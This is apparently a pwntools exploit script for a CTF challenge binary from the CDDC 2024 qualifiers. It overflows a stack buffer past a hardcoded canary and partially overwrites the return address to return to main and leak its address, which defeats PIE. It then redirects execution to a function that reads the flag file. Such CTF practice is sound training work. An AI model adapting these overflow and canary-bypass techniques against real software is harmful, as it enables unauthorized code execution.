from pwn import *

# p = remote("cddc2024-qualifiers-nlb-231aa6753cb7a1e6.elb.ap-southeast-1.amazonaws.com", 10914)
p = process("./binary")
elf = ELF("binary")

# gdbscript = '''
# continue
# '''.format(**locals())

# gdb.attach(p, gdbscript=gdbscript)

'''
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
'''

# Full protections enabled, but canary seems to be consistent between runs for the same binary - likely specific offset in binary (?)
canary = 0x3bbffdd715f99595

# BOF to canary offset - After this offset immediately is canary
offset = 1264-8

p.recvuntil("> ")

# main: 0x001013B2
# PIE is enabled, but we can still overwrite last byte due to PIE not affecting last bytes
# This way we redirect control back to main() without PIE leak 
p.send(b"A" * offset + p64(canary) + b"BBBBBBBB" + p8(0xB2))

p.recvuntil("> ")

p.recvuntil(b"\xB2")

# Receive until LSB of main (0xB2) then 
main = u64((b"\xB2" + p.recv(5)).ljust(8, b"\0")) 

print(f"main: {hex(main)}")

# Offset to FUN_00101355 which does ORW ./flag 
FUN_00101355 = 0x1355 - 0x13B2

p.recvuntil("> ")

p.sendline(b"A" * offset + p64(canary) + b"BBBBBBBB" + p64(main + FUN_00101355))

p.interactive()

